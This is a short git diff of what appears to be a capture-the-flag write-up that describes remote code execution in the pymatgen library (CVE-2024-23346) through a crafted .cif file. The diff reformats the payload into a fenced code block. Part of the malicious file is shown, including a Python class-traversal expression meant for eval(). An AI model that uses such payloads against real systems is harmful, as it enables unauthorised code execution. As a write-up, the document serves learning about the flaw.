@@ -20,7 +20,8 @@ However the python version used that we enumerated earlier is vulnerable.
 Uploading malicious .cif file can trigger RCE because of broken eval() function.  
 [CVE-2024-23346](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346)
 Here is the crafted payload that i used.
-`data_Example
+```vuln.cif
+data_Example
 _cell_length_a    10.00000
 _cell_length_b    10.00000
 _cell_length_c    10.00000
@@ -41,4 +42,4 @@ _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1]
 
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
-`
+```
